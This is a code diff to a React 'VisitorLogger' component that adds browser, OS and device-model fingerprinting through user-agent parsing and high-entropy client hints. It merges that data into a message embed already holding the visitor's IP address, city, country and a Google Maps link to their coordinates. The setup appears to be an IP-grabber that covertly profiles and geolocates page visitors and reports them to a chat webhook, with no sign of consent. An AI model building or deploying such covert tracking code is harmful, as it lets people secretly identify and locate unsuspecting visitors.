@@ -30,6 +30,58 @@ export default function VisitorLogger() {
         }
 
         // B. Hardware Fingerprint
+        const getDeviceInfo = async () => {
+          const ua = navigator.userAgent;
+          const uad = navigator.userAgentData;
+          
+          let browser = "Unknown Browser";
+          let os = "Unknown OS";
+          let model = "";
+
+          if (uad) {
+            // Modern browsers (Chrome, Edge, etc.)
+            const brand = uad.brands.find(b => b.brand !== 'Not A;Brand');
+            browser = brand ? brand.brand : "Unknown Browser";
+            os = uad.platform || "Unknown OS";
+            
+            try {
+              const entropy = await uad.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
+              if (entropy.model && entropy.model !== "") {
+                model = ` (${entropy.model})`;
+              } else if (ua.includes("Windows")) {
+                // If model is empty on Windows, it often means it's a PC
+                model = " (PC)";
+              }
+              if (entropy.platformVersion) {
+                // platformVersion for Windows is usually the major version or build
+                // but it's hard to map precisely to 10/11 without a map.
+              }
+            } catch (e) {}
+          } else {
+            // Fallback to legacy UA parsing
+            if (ua.includes("Firefox/")) browser = "Firefox";
+            else if (ua.includes("Edg/")) browser = "Edge";
+            else if (ua.includes("Chrome/")) browser = "Chrome";
+            else if (ua.includes("Safari/")) browser = "Safari";
+            else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "Internet Explorer";
+
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Macintosh")) os = "macOS";
+            else if (ua.includes("Android")) {
+              const match = ua.match(/Android\s([0-9\.]+)/);
+              os = match ? `Android ${match[1]}` : "Android";
+              const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
+              if (modelMatch) model = ` (${modelMatch[1]})`;
+            }
+            else if (ua.includes("iPhone")) os = "iPhone";
+            else if (ua.includes("iPad")) os = "iPad";
+            else if (ua.includes("Linux")) os = "Linux";
+          }
+
+          return `${os}${model} | ${browser}`;
+        };
+        const deviceInfo = await getDeviceInfo();
+
         const getGPU = () => {
           try {
             const canvas = document.createElement('canvas')
@@ -76,6 +128,11 @@ export default function VisitorLogger() {
                 name: "🏠 Identity", 
                 value: `**IP:** \`${userIp}\`\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n📍 [View on Google Maps](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})`, 
                 inline: false 
+              },
+              {
+                name: "📱 Device & Browser",
+                value: `**Info:** \`${deviceInfo}\``,
+                inline: false
               },
               { 
                 name: "🔗 Origin", 
